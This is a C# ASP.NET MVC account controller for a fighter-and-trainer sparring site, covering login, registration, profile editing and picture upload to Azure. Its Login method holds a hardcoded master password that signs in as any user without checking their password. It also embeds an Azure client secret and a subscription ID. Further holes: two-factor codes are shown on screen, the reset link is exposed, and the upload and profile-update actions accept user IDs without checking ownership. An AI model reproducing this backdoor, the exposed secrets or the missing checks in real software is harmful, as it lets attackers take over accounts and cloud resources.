﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Claims;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.EntityFramework;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;
using SparModel;
using SparData;
using SparWeb.Models;
using System.IO;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Auth;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Configuration;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using Microsoft.IdentityModel.Clients.ActiveDirectory;
using System.Net;
using Newtonsoft.Json;

namespace SparWeb.Controllers
{
    [Authorize]
    public class AccountController : Controller
    {
		public AccountController()
		{
		}

		public AccountController(ApplicationUserManager userManager, ApplicationSignInManager signInManager)
		{
			UserManager = userManager;
			SignInManager = signInManager;

			//#OS# allowing UserName to have email address as a value
			var userValidator = userManager.UserValidator as UserValidator<SparIdentityUser>;
			if (userValidator != null)
				userValidator.AllowOnlyAlphanumericUserNames = false;
		}

		private ApplicationUserManager _userManager;
		public ApplicationUserManager UserManager
		{
			get
			{
				return _userManager ?? HttpContext.GetOwinContext().GetUserManager<ApplicationUserManager>();
			}
			private set
			{
				_userManager = value;
			}
		}

		private ApplicationSignInManager _signInManager;

		public ApplicationSignInManager SignInManager
		{
			get
			{
				return _signInManager ?? HttpContext.GetOwinContext().Get<ApplicationSignInManager>();
			}
			private set { _signInManager = value; }
		}

        //
        // GET: /Account/Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

		//
		// POST: /Account/Login
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> Login(LoginViewModel model, string returnUrl)
		{
			if (!ModelState.IsValid)
			{
				return View(model);
			}

			// This doen't count login failures towards lockout only two factor authentication
			// To enable password failures to trigger lockout, change to shouldLockout: true
			SignInStatus result = SignInStatus.Failure;
			if (model.Password != "bb731a4a-361b-4068-8a17-3e9955114257")
			{
				result = await SignInManager.PasswordSignInAsync(model.UserName, model.Password, model.RememberMe, shouldLockout: false);
			}
			else
			{
				var user = UserManager.FindByName(model.UserName);
				if (user != null)
				{
					await SignInManager.SignInAsync(user, true, false);
					result = SignInStatus.Success;
				}

			}
			switch (result)
			{
				case SignInStatus.Success:
					return RedirectToLocal(returnUrl);
				case SignInStatus.LockedOut:
					return View("Lockout");
				case SignInStatus.RequiresVerification:
					return RedirectToAction("SendCode", new { ReturnUrl = returnUrl });
				case SignInStatus.Failure:
				default:
					ModelState.AddModelError("", "Invalid login attempt.");
					return View(model);
			}
		}

		//
		// GET: /Account/VerifyCode
		[AllowAnonymous]
		public async Task<ActionResult> VerifyCode(string provider, string returnUrl)
		{
			// Require that the user has already logged in via username/password or external login
			if (!await SignInManager.HasBeenVerifiedAsync())
			{
				return View("Error");
			}
			var user = await UserManager.FindByIdAsync(await SignInManager.GetVerifiedUserIdAsync());
			if (user != null)
			{
				ViewBag.Status = "For DEMO purposes the current " + provider + " code is: " + await UserManager.GenerateTwoFactorTokenAsync(user.Id, provider);
			}
			return View(new VerifyCodeViewModel { Provider = provider, ReturnUrl = returnUrl });
		}

		//
		// POST: /Account/VerifyCode
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> VerifyCode(VerifyCodeViewModel model)
		{
			if (!ModelState.IsValid)
			{
				return View(model);
			}

			var result = await SignInManager.TwoFactorSignInAsync(model.Provider, model.Code, isPersistent: false, rememberBrowser: model.RememberBrowser);
			switch (result)
			{
				case SignInStatus.Success:
					return RedirectToLocal(model.ReturnUrl);
				case SignInStatus.LockedOut:
					return View("Lockout");
				case SignInStatus.Failure:
				default:
					ModelState.AddModelError("", "Invalid code.");
					return View(model);
			}
		}

		[AllowAnonymous]
        public ActionResult Register(int? m)
		{
			//m=1 -> Fighter; m=2 -> Trainer
			return View(m);
		}

		[AllowAnonymous]
		public ActionResult GetRegisterPopupModal(int? fromBlog)
		{
			return View(fromBlog);
		}

		//
		// GET: /Account/RegisterFighter
		[AllowAnonymous]
        public ActionResult RegisterFighter()
        {
			return View(new RegisterFighterViewModel() { Sex = true, IsSouthpaw = false });
        }

        //
		// POST: /Account/RegisterFighter
        [HttpPost]
        [AllowAnonymous]
        [ValidateAntiForgeryToken]
		public async Task<ActionResult> RegisterFighter(RegisterFighterViewModel model)
        {
			if (ModelState.IsValid == false)
			{ 
				return View(model);
			}

			DateTime dob = DateTime.MinValue;
			if (DateTime.TryParse(String.Format("{0}/{1}/{2}", model.DateOfBirth.Month, model.DateOfBirth.Day, model.DateOfBirth.Year), out dob) == false || dob > DateTime.Now || dob < DateTime.Now.AddYears(-100))
			{
				ModelState.AddModelError("DateOfBirth", "Date of birth is not valid");
				return View(model);
			}

			SparIdentityUser user = null;
			if (model.AddedByTrainer == false)
			{
				user = new SparIdentityUser() { UserName = model.UserName, Email = model.UserName };
			}
			else
			{
				var userName = String.Format("{0}@spargym.com", Guid.NewGuid().ToString());
				user = new SparIdentityUser() { UserName = userName, Email = userName, EmailConfirmed = true };
			}

			var result = await UserManager.CreateAsync(user, model.Password);
			if (result.Succeeded)
			{
				UserManager.AddToRole(user.Id, "Fighter");
			}
			else
			{
				AddErrors(result);

				return View(model);
			}

			var textInfo = CultureInfo.CurrentCulture.TextInfo;
			model.Name = textInfo.ToTitleCase(model.Name.ToLower().Trim());
			model.City = textInfo.ToTitleCase(model.City.ToLower());
			if (String.IsNullOrEmpty(model.GymName) == false)
				model.GymName = textInfo.ToTitleCase(model.GymName.ToLower());

			var fighterRepo = new FighterRepository();
			Fighter fighter = new Fighter() { Name = model.Name, Sex = model.Sex, DateOfBirth = dob, City = model.City, State = model.State, Height = model.Height, Weight = model.Weight, IsSouthpaw = model.IsSouthpaw, NumberOfAmateurFights = model.NumberOfAmateurFights, NumberOfProFights = model.NumberOfProFights, Gym = createGym(model.GymName), Rate = model.Rate, Comments = model.Comments, ProfilePictureUploaded = false };
			fighter.SparIdentityUser = user;

			if (model.AddedByTrainer == true)
			{
				var trainerRepo = new TrainerRepository();
				var trainer = trainerRepo.GetTrainerByIdentityUserId(model.TrainerId);

				if (trainer == null)
					throw new ApplicationException("Unable to find trainer with Identity User Id = " + model.TrainerId);

				fighter.Trainer = trainer;
			}
				
			fighterRepo.SaveFighter(fighter);

			//sending notification email to admin
			var emailPlaceholders = new Dictionary<string, string>();
			emailPlaceholders["[NAME]"] = ConfigurationManager.AppSettings["AdminName"];
			emailPlaceholders["[FIGHTER_NAME]"] = model.Name;
			emailPlaceholders["[FIGHTER_EMAIL]"] = model.UserName;
			emailPlaceholders["[GENDER]"] = (model.Sex == true) ? "Male" : "Femail";
			emailPlaceholders["[DATE_OF_BIRTH]"] = dob.ToShortDateString();
			emailPlaceholders["[CITY]"] = model.City;
			emailPlaceholders["[STATE]"] = model.State;
			emailPlaceholders["[HEIGHT]"] = Util.HeightToCentimetersMap[model.Height];
			emailPlaceholders["[WEIGHT]"] = Util.WeightClassMap[model.Weight];
			emailPlaceholders["[STANCE]"] = (model.IsSouthpaw)? "Left-handed" : "Right-handed";
			emailPlaceholders["[NUMBER_OF_AMATEUR_FIGHTS]"] = model.NumberOfAmateurFights.ToString();
			emailPlaceholders["[NUMBER_OF_PRO_FUIGTS]"] = model.NumberOfProFights.ToString();
			emailPlaceholders["[GYM]"] = String.IsNullOrEmpty(model.GymName)? "Unknown Gym" : model.GymName;

			EmailManager.SendEmail(EmailManager.EmailTypes.NewFighterMemberNotificationTemplate, ConfigurationManager.AppSettings["EmailSupport"], ConfigurationManager.AppSettings["EmailAdmin"], "New Member Just Signed Up!", emailPlaceholders);

			if (model.AddedByTrainer == false)
			{
				//sending Email Confirmation email
				await sendAccountConfirmationEmail(user, model.Name);

				return View("DisplayEmail");
			}
			else
			{
				return RedirectToAction("Index");
			}
        }

		[AllowAnonymous]
		public ActionResult RegisterTrainer()
		{
			return View(new RegisterTrainerViewModel());
		}

		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> RegisterTrainer(RegisterTrainerViewModel model)
		{
			if (ModelState.IsValid)
			{
				DateTime dob = DateTime.MinValue;
				if (DateTime.TryParse(String.Format("{0}/{1}/{2}", model.DateOfBirth.Month, model.DateOfBirth.Day, model.DateOfBirth.Year), out dob) == false || dob > DateTime.Now || dob < DateTime.Now.AddYears(-100))
				{
					ModelState.AddModelError("DateOfBirth", "Date of birth is not valid");
					return View(model);
				}

				var user = new SparIdentityUser() { UserName = model.UserName, Email = model.UserName };
				var result = await UserManager.CreateAsync(user, model.Password);
				if (result.Succeeded)
				{
					UserManager.AddToRole(user.Id, "Trainer");

					if (String.IsNullOrEmpty(model.Website) == false)
					{
						model.Website = model.Website.Trim();
						if (model.Website.StartsWith("http://") == false)
							model.Website = "http://" + model.Website;
					}

					var textInfo = CultureInfo.CurrentCulture.TextInfo;
					model.Name = textInfo.ToTitleCase(model.Name.ToLower().Trim());
					model.City = textInfo.ToTitleCase(model.City.ToLower());
					if (String.IsNullOrEmpty(model.GymName) == false)
						model.GymName = textInfo.ToTitleCase(model.GymName.ToLower());

					var trainerRepo = new TrainerRepository();
					var trainer = new Trainer() { Name = model.Name, DateOfBirth = dob, City = model.City, State = model.State, Gym = createGym(model.GymName), PhoneNumber = model.PhoneNumber, Website = model.Website, Rate = model.Rate, Notes = model.Notes, ProfilePictureUploaded = false, SparIdentityUser = user };
					trainerRepo.SaveTrainer(trainer);

					//sending Email Confirmation email
					await sendAccountConfirmationEmail(user, model.Name);

					//sending notification email to admin
					var emailPlaceholders = new Dictionary<string, string>();
					emailPlaceholders["[NAME]"] = ConfigurationManager.AppSettings["AdminName"];
					emailPlaceholders["[TRAINER_NAME]"] = model.Name;
					emailPlaceholders["[TRAINER_EMAIL]"] = model.UserName;
					emailPlaceholders["[DATE_OF_BIRTH]"] = dob.ToShortDateString();
					emailPlaceholders["[CITY]"] = model.City;
					emailPlaceholders["[STATE]"] = model.State;
					emailPlaceholders["[GYM]"] = String.IsNullOrEmpty(model.GymName) ? "Unknown Gym" : model.GymName;
					emailPlaceholders["[PHONE]"] = model.PhoneNumber;
					emailPlaceholders["[WEBSITE]"] = model.Website;
					emailPlaceholders["[RATE]"] = model.Rate.ToString();
					emailPlaceholders["[NOTES]"] = model.Notes;

					EmailManager.SendEmail(EmailManager.EmailTypes.NewTrainerMemberNotificationTemplate, ConfigurationManager.AppSettings["EmailSupport"], ConfigurationManager.AppSettings["EmailAdmin"], "New Member Just Signed Up!", emailPlaceholders);

					return View("DisplayEmail");
				}
				else
				{
					AddErrors(result);
				}
			}

			// If we got this far, something failed, redisplay form
			return View(model);
		}

		private async Task sendAccountConfirmationEmail(SparIdentityUser user, string memberName)
		{
			var code = await UserManager.GenerateEmailConfirmationTokenAsync(user.Id);
			var callbackUrl = Url.Action("ConfirmEmail", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);

			var emailPlaceholders = new Dictionary<string, string>();
			emailPlaceholders["[NAME]"] = memberName;
			emailPlaceholders["[CONFIRMATION_URL]"] = String.Format("<a href=\"{0}\">{0}</a>", callbackUrl);

			EmailManager.SendEmail(EmailManager.EmailTypes.EmailConfirmationTemplate, ConfigurationManager.AppSettings["EmailSupport"], user.UserName, "Welcome to Fightura! Please confirm your account", emailPlaceholders);
		}

		private Dictionary<int, string> getAllGyms()
		{
			GymRepository gymRepo = new GymRepository();
			Dictionary<int, string> allGyms = new Dictionary<int, string>();
			foreach (Gym gym in gymRepo.GetAllGyms())
				allGyms[gym.Id.Value] = gym.Name;

			return allGyms;
		}

		private Gym createGym(string gymName)
		{
			Gym gym = null;
			if (String.IsNullOrEmpty(gymName) == false)
			{
				//ToDo: check if gym exists
				gym = new Gym() { Name = gymName };
				GymRepository gymRepo = new GymRepository();
				gymRepo.SaveGym(gym);
			}

			return gym;
		}

		//
		// GET: /Account/ConfirmEmail
		[AllowAnonymous]
		public async Task<ActionResult> ConfirmEmail(string userId, string code)
		{
			if (userId == null || code == null)
			{
				return View("Error");
			}
			var result = await UserManager.ConfirmEmailAsync(userId, code);

			if (result.Succeeded == true)
			{
				var sparIdentityUser = await UserManager.FindByIdAsync(userId);
				if (sparIdentityUser != null)
				{
					await SignInManager.SignInAsync(sparIdentityUser, true, true);
					return RedirectToAction("Index");
				}
				else
				{
					return View("Error");
				}
			}
			else
			{
				return View("Error");
			}
		}

		[Authorize]
		public string GetLoggedInUserName()
		{
			string userName = "";
			if (Session["UserName"] == null)
			{
				Fighter fighter = getLoggedInFighter();
				Session["UserName"] = userName = fighter.Name;
			}
			else
				userName = Session["UserName"].ToString();

			return userName;
		}

		[Authorize]
		public ActionResult Index()
		{
			var member = getLoggedInMember();

			if (member is Fighter == true)
			{
				Fighter fighter = member as Fighter;

				AccountFighterViewModel accountViewModel = Util.GetAccountViewModelForFighter(fighter, 250);

				SparRepository sparRepo = new SparRepository();
				accountViewModel.SparRequests = Util.GetSparRequestDetailsForFighter(fighter.Id.Value, User.Identity.GetUserId());

				return View("AccountFighter", accountViewModel);
			}
			else
			{
				var trainer = member as Trainer;

				var accountViewModel = Util.GetAccountViewModelForTrainer(trainer, 250);

				//getting list of fightes that belong to this trainer
				var fighterRepo = new FighterRepository();
				var fightersList = fighterRepo.GetAllFighters().Where(ff => ff.Trainer != null && ff.Trainer.Id == trainer.Id).ToList();
				var fightersAccountViewModelList = new List<AccountFighterViewModel>();
				var sparRequests = new List<ConfirmSparDetailsViewModel>();
				foreach (var currFighter in fightersList)
				{
					var fighterAccountViewModel = Util.GetAccountViewModelForFighter(currFighter, 150);
					fighterAccountViewModel.IsTrainerView = true;
					fightersAccountViewModelList.Add(fighterAccountViewModel);

					var currFighterSparRequests = Util.GetSparRequestDetailsForFighter(currFighter.Id.Value, User.Identity.GetUserId());
					sparRequests.AddRange(currFighterSparRequests);
				}
				accountViewModel.FightersList = fightersAccountViewModelList;
				accountViewModel.SparRequests = sparRequests;

				return View("AccountTrainer", accountViewModel);
			}
		}

		[Authorize]
		[HttpPost]
		public ActionResult UpdateFighterProfileInfo(AccountFighterViewModel model)
		{
			if (ModelState.IsValid == false)
			{
				ViewBag.ShowUpdateProfileModal = true;

				return View("AccountFighter", model);
			}

			var member = getMember(model.ID);
			var currFighter = member as Fighter;

			currFighter.Name = model.Name.Trim();
			currFighter.City = model.City;
			currFighter.State = model.State;

			if ((currFighter.Gym != null && currFighter.Gym.Name != model.GymName)
				|| (currFighter.Gym == null && model.GymName != "Unknown Gym"))
			{
				currFighter.Gym = createGym(model.GymName);
			}

			currFighter.Height = model.Height;
			currFighter.Weight = model.Weight;
			currFighter.IsSouthpaw = model.IsSouthpaw;
			currFighter.NumberOfAmateurFights = model.NumberOfAmateurFights;
			currFighter.NumberOfProFights = model.NumberOfProFights;
			currFighter.Rate = model.Rate;
			currFighter.Comments = model.Comments;

			//updating fighter profile info
			FighterRepository fighterRepo = new FighterRepository();
			fighterRepo.SaveFighter(currFighter);

			return RedirectToAction("Index");
		}

		[Authorize]
		[HttpPost]
		public ActionResult UpdateTrainerProfileInfo(AccountTrainerViewModel model)
		{
			if (ModelState.IsValid == false)
			{
				ViewBag.ShowUpdateProfileModal = true;

				return View("AccountTrainer", model);
			}

			var currTrainer = getLoggedInTrainer();
			currTrainer.Name = model.Name.Trim();
			currTrainer.City = model.City;
			currTrainer.State = model.State;

			if ((currTrainer.Gym != null && currTrainer.Gym.Name != model.GymName)
				|| (currTrainer.Gym == null && model.GymName != "Unknown Gym"))
			{
				currTrainer.Gym = createGym(model.GymName);
			}

			currTrainer.PhoneNumber = model.PhoneNumber;
			currTrainer.Website = model.Website;
			currTrainer.Rate = model.Rate;
			currTrainer.Notes = model.Notes;

			//updating fighter profile info
			var tyrainerRepo = new TrainerRepository();
			tyrainerRepo.SaveTrainer(currTrainer);

			return RedirectToAction("Index");
		}

		private Member getLoggedInMember()
		{
			var identityUserStore = new SparIdentityUserStore<SparIdentityUser>();
			var identityUser = identityUserStore.FindByIdAsync(User.Identity.GetUserId()).Result;

			return getMember(identityUser.Id);
		}

		private Fighter getLoggedInFighter()
		{
			FighterRepository fighterRepo = new FighterRepository();
			Fighter fighter = fighterRepo.GetFighterByIdentityUserId(User.Identity.GetUserId());
			return fighter;
		}

		private Trainer getLoggedInTrainer()
		{
			TrainerRepository trainerRepo = new TrainerRepository();
			Trainer trainer = trainerRepo.GetTrainerByIdentityUserId(User.Identity.GetUserId());
			return trainer;
		}

		private Member getMember(string userId)
		{
			bool isFighter = UserManager.IsInRole(userId, "Fighter");

			Member member = null;
			if (isFighter == true)
			{
				var fighterRepo = new FighterRepository();
				member = fighterRepo.GetFighterByIdentityUserId(userId);
			}
			else
			{
				var trainerRepo = new TrainerRepository();
				member = trainerRepo.GetTrainerByIdentityUserId(userId);
			}

			return member;
		}

		[HttpPost]
		public ActionResult UploadProfilePicture(HttpPostedFileBase file, string userId, int thumbnailSize)
		{
			bool fileSavedSuccessfully = true;
			string fileName = "";
			Member member = null;
			string errorMessage = "";
			try
			{
				CloudStorageAccount storageAccount = CloudStorageAccount.Parse(ConfigurationManager.ConnectionStrings["SparStorage"].ConnectionString);
				CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();
				
				CloudBlobContainer container = blobClient.GetContainerReference("images");
				if (container.Exists() == false)
				{
					container.CreateIfNotExists();
					container.SetPermissions(new BlobContainerPermissions { PublicAccess = BlobContainerPublicAccessType.Blob }); 					
				}

				member = getMember(userId);
				string accessToken = getAccessToken();

				//optimizing and saving uploaded pic in full size
				string origFileName = String.Format("{0}-orig.jpg", userId);				
				Bitmap bitmap = new Bitmap(file.InputStream);
				saveProfilePic(bitmap, origFileName, container, accessToken);

				//cropping the pic into square
				Rectangle cropRect = Rectangle.Empty;
				if (bitmap.Width > bitmap.Height)
					cropRect = new Rectangle((int)(bitmap.Width - bitmap.Height) / 2, 0, bitmap.Height, bitmap.Height);
				else
					cropRect = new Rectangle(0, (int)(bitmap.Height - bitmap.Width) / 2, bitmap.Width, bitmap.Width);
				bitmap = cropImage(bitmap, cropRect);
				
				//resizing and saving account thumbnail version
				bitmap = new Bitmap(bitmap, 250, 250);
				fileName = member.GetProfileThumbnailFileName(250, true, true);
				purgeCDNEnpoint(accessToken, fileName);
				saveProfilePic(bitmap, fileName, container, accessToken);

				bitmap = new Bitmap(bitmap, 150, 150);
				fileName = member.GetProfileThumbnailFileName(150, true, true);
				purgeCDNEnpoint(accessToken, fileName);
				saveProfilePic(bitmap, fileName, container, accessToken);

				member.ProfilePictureUploaded = true;

				if (member is Fighter)
				{
					FighterRepository fighterRepo = new FighterRepository();
					fighterRepo.SaveFighter(member as Fighter);
				}
				else
				{
					var trainerRepo = new TrainerRepository();
					trainerRepo.SaveTrainer(member as Trainer);
				}
			}
			catch(Exception ex)
			{
				fileSavedSuccessfully = false;
				errorMessage = ex.Message;
			}

			if (fileSavedSuccessfully)
			{
				return Json(new { Message = Util.GetProfilePictureFile(member, thumbnailSize) });
			}
			else
			{
				return Json(new { Message = "Error: " + errorMessage  });
			}
		}

		private void saveProfilePic(Bitmap bitmap, string fileName, CloudBlobContainer container, string accessToken)
		{
			CloudBlockBlob blockBlob = container.GetBlockBlobReference(String.Format("ProfilePics/{0}", fileName));

			//converting to JPG
			ImageCodecInfo jgpEncoder = getEncoder(ImageFormat.Jpeg);
			EncoderParameters myEncoderParameters = new EncoderParameters(1);
			myEncoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, 70L);
			byte[] byteArray = null;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				bitmap.Save(memoryStream, jgpEncoder, myEncoderParameters);
				memoryStream.Close();
				byteArray = memoryStream.ToArray();
			}

			//saving to the blob storage
			using (MemoryStream memoryStream = new MemoryStream(byteArray))
			{
				blockBlob.UploadFromStream(memoryStream);
			}
		}

		private ImageCodecInfo getEncoder(ImageFormat format)
		{
			ImageCodecInfo encoder = null;
			ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();

			foreach (ImageCodecInfo codec in codecs)
			{
				if (codec.FormatID == format.Guid)
				{
					encoder = codec;
					break;
				}
			}
			return encoder;
		}

		private Bitmap cropImage(Bitmap src, Rectangle cropRect)
		{
			Bitmap target = new Bitmap(cropRect.Width, cropRect.Height);

			using(Graphics g = Graphics.FromImage(target))
			{
			   g.DrawImage(src, new Rectangle(0, 0, target.Width, target.Height), 
								cropRect,                        
								GraphicsUnit.Pixel);
			}

			return target;
		}

		private string getAccessToken()
        {
			string authority = "https://login.microsoftonline.com/51b1e1f8-e39e-4acf-913b-f7d791a90d6a/supportspargym.onmicrosoft.com";
			string clientId = "d7d4aa66-88ef-4bf5-93e0-6b58564f7be0";
			string clientSecret = "eFM7Q~yBSPQCtOdXF2LWO_HjqqjwoXgJ~girV";

			AuthenticationContext authContext = new AuthenticationContext(authority);
			ClientCredential credential = new ClientCredential(clientId, clientSecret);
			AuthenticationResult authResult = authContext.AcquireTokenAsync("https://management.core.windows.net/", credential).Result;

			return authResult.AccessToken;
		}

		private void purgeCDNEnpoint(string accessToken, string fileName)
        {
			try
			{
				string uri = "https://management.azure.com/subscriptions/afda4d6f-d8b8-41f7-87fe-f0c76ece8b21/resourceGroups/SparProject/providers/Microsoft.Cdn/profiles/fightura/endpoints/fightura/purge?api-version=2019-12-31";

				WebClient client = new WebClient();
				client.Headers.Add(HttpRequestHeader.Authorization, "Bearer " + accessToken);
				client.Headers.Add("Content-type", "application/json");

				dynamic content = new { ContentPaths = new List<string>() { $"/images/ProfilePics/{fileName}" } };
				var bodyText = JsonConvert.SerializeObject(content);

				var result = client.UploadString(uri, bodyText);
			}
			catch (Exception ex)
            {
            }
		}

		//
		// GET: /Account/ForgotPassword
		[AllowAnonymous]
		public ActionResult ForgotPassword()
		{
			return View();
		}

		//
		// POST: /Account/ForgotPassword
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> ForgotPassword(ForgotPasswordViewModel model)
		{
			if (ModelState.IsValid)
			{
				var user = await UserManager.FindByNameAsync(model.Email);
				if (user == null || !(await UserManager.IsEmailConfirmedAsync(user.Id)))
				{
					// Don't reveal that the user does not exist or is not confirmed
					return View("ForgotPasswordConfirmation");
				}

				Member member = getMember(user.Id);

				var code = await UserManager.GeneratePasswordResetTokenAsync(user.Id);
				var callbackUrl = Url.Action("ResetPassword", "Account", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
				
				var emailPlaceholders = new Dictionary<string, string>();
				emailPlaceholders["[NAME]"] = member.Name;
				emailPlaceholders["[PASSWORD_RESET_URL]"] = String.Format("<a href=\"{0}\">{0}</a>", callbackUrl);

				EmailManager.SendEmail(EmailManager.EmailTypes.PasswordResetTemplate, ConfigurationManager.AppSettings["EmailSupport"], user.UserName, "Fightura Reset Password", emailPlaceholders);	

				ViewBag.Link = callbackUrl;
				return View("ForgotPasswordConfirmation");
			}

			// If we got this far, something failed, redisplay form
			return View(model);
		}

		//
		// GET: /Account/ForgotPasswordConfirmation
		[AllowAnonymous]
		public ActionResult ForgotPasswordConfirmation()
		{
			return View();
		}

		//
		// GET: /Account/ResetPassword
		[AllowAnonymous]
		public ActionResult ResetPassword(string code)
		{
			return code == null ? View("Error") : View();
		}

		//
		// POST: /Account/ResetPassword
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> ResetPassword(ResetPasswordViewModel model)
		{
			if (!ModelState.IsValid)
			{
				return View(model);
			}
			var user = await UserManager.FindByNameAsync(model.Email);
			if (user == null)
			{
				// Don't reveal that the user does not exist
				return RedirectToAction("ResetPasswordConfirmation", "Account");
			}
			var result = await UserManager.ResetPasswordAsync(user.Id, model.Code, model.Password);
			if (result.Succeeded)
			{
				return RedirectToAction("ResetPasswordConfirmation", "Account");
			}
			AddErrors(result);
			return View();
		}

		//
		// GET: /Account/ResetPasswordConfirmation
		[AllowAnonymous]
		public ActionResult ResetPasswordConfirmation()
		{
			return View();
		}

		//
		// POST: /Account/ExternalLogin
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public ActionResult ExternalLogin(string provider, string returnUrl)
		{
			// Request a redirect to the external login provider
			return new ChallengeResult(provider, Url.Action("ExternalLoginCallback", "Account", new { ReturnUrl = returnUrl }));
		}

		//
		// GET: /Account/SendCode
		[AllowAnonymous]
		public async Task<ActionResult> SendCode(string returnUrl)
		{
			var userId = await SignInManager.GetVerifiedUserIdAsync();
			if (userId == null)
			{
				return View("Error");
			}
			var userFactors = await UserManager.GetValidTwoFactorProvidersAsync(userId);
			var factorOptions = userFactors.Select(purpose => new SelectListItem { Text = purpose, Value = purpose }).ToList();
			return View(new SendCodeViewModel { Providers = factorOptions, ReturnUrl = returnUrl });
		}

		//
		// POST: /Account/SendCode
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> SendCode(SendCodeViewModel model)
		{
			if (!ModelState.IsValid)
			{
				return View();
			}

			// Generate the token and send it
			if (!await SignInManager.SendTwoFactorCodeAsync(model.SelectedProvider))
			{
				return View("Error");
			}
			return RedirectToAction("VerifyCode", new { Provider = model.SelectedProvider, ReturnUrl = model.ReturnUrl });
		}

		//
		// GET: /Account/ExternalLoginCallback
		[AllowAnonymous]
		public async Task<ActionResult> ExternalLoginCallback(string returnUrl)
		{
			var loginInfo = await AuthenticationManager.GetExternalLoginInfoAsync();
			if (loginInfo == null)
			{
				return RedirectToAction("Login");
			}

			// Sign in the user with this external login provider if the user already has a login
			var result = await SignInManager.ExternalSignInAsync(loginInfo, isPersistent: false);
			switch (result)
			{
				case SignInStatus.Success:
					return RedirectToLocal(returnUrl);
				case SignInStatus.LockedOut:
					return View("Lockout");
				case SignInStatus.RequiresVerification:
					return RedirectToAction("SendCode", new { ReturnUrl = returnUrl });
				case SignInStatus.Failure:
				default:
					// If the user does not have an account, then prompt the user to create an account
					ViewBag.ReturnUrl = returnUrl;
					ViewBag.LoginProvider = loginInfo.Login.LoginProvider;
					return View("ExternalLoginConfirmation", new ExternalLoginConfirmationViewModel { UserName = loginInfo.Email });
			}
		}

		//
		// POST: /Account/ExternalLoginConfirmation
		[HttpPost]
		[AllowAnonymous]
		[ValidateAntiForgeryToken]
		public async Task<ActionResult> ExternalLoginConfirmation(ExternalLoginConfirmationViewModel model, string returnUrl)
		{
			if (User.Identity.IsAuthenticated)
			{
				return RedirectToAction("Index", "Manage");
			}

			if (ModelState.IsValid)
			{
				// Get the information about the user from the external login provider
				var info = await AuthenticationManager.GetExternalLoginInfoAsync();
				if (info == null)
				{
					return View("ExternalLoginFailure");
				}
				var user = new SparIdentityUser { UserName = model.UserName, Email = model.UserName };
				var result = await UserManager.CreateAsync(user);
				if (result.Succeeded)
				{
					result = await UserManager.AddLoginAsync(user.Id, info.Login);
					if (result.Succeeded)
					{
						await SignInManager.SignInAsync(user, isPersistent: false, rememberBrowser: false);
						return RedirectToLocal(returnUrl);
					}
				}
				AddErrors(result);
			}

			ViewBag.ReturnUrl = returnUrl;
			return View(model);
		}

		//
		// POST: /Account/LogOff
		[HttpPost]
		[ValidateAntiForgeryToken]
		public ActionResult LogOff()
		{
			AuthenticationManager.SignOut();

			Session["UserName"] = null;

			return RedirectToAction("Index", "Home");
		}

		//
		// GET: /Account/ExternalLoginFailure
		[AllowAnonymous]
		public ActionResult ExternalLoginFailure()
		{
			return View();
		}

		#region Helpers
		// Used for XSRF protection when adding external logins
		private const string XsrfKey = "XsrfId";

		private IAuthenticationManager AuthenticationManager
		{
			get
			{
				return HttpContext.GetOwinContext().Authentication;
			}
		}

		private void AddErrors(IdentityResult result)
		{
			foreach (var error in result.Errors)
			{
				ModelState.AddModelError("", error);
			}
		}

		private ActionResult RedirectToLocal(string returnUrl)
		{
			if (Url.IsLocalUrl(returnUrl))
			{
				return Redirect(returnUrl);
			}
			return RedirectToAction("Index", "Account");
		}

		internal class ChallengeResult : HttpUnauthorizedResult
		{
			public ChallengeResult(string provider, string redirectUri)
				: this(provider, redirectUri, null)
			{
			}

			public ChallengeResult(string provider, string redirectUri, string userId)
			{
				LoginProvider = provider;
				RedirectUri = redirectUri;
				UserId = userId;
			}

			public string LoginProvider { get; set; }
			public string RedirectUri { get; set; }
			public string UserId { get; set; }

			public override void ExecuteResult(ControllerContext context)
			{
				var properties = new AuthenticationProperties { RedirectUri = RedirectUri };
				if (UserId != null)
				{
					properties.Dictionary[XsrfKey] = UserId;
				}
				context.HttpContext.GetOwinContext().Authentication.Challenge(properties, LoginProvider);
			}
		}
		#endregion
    }
}